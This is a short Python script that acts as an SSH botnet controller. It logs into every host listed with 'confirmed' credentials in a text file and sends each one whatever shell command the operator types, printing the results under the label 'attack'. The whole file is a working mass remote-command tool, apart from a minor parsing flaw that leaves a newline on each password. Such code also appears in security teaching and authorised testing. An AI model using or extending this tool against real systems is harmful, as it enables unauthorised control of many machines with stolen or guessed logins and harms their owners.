#!/usr/bin/python3
from pexpect import pxssh


class Bot:
    # Initializes new target
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    # Handles SSH connection to target
    def ssh(self):
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot

    # Handles sending commands to target
    def send_command(self, command):
        self.session.sendline(command)
        self.session.prompt()
        print(("-" * 50), f"{self.host}", ("-" * 50))
        return str(self.session.before.decode())


# Sends command to all bots
def _control_center(command):
    # Use confirmed creds to connect
    with open("confirmed.txt", "r") as bots:
        for bot in bots.readlines():  # Assuming one host:user:password per line
            host = bot.split(":")[0]
            user = bot.split(":")[1]
            password = bot.split(":")[2]
            attack = Bot(host, user, password).send_command(command)
            print(str(attack))


def _new_command():
    command = input(">>>")
    while command.lower() != "exit":
        _control_center(command)
        command = input(">>>")


_new_command()
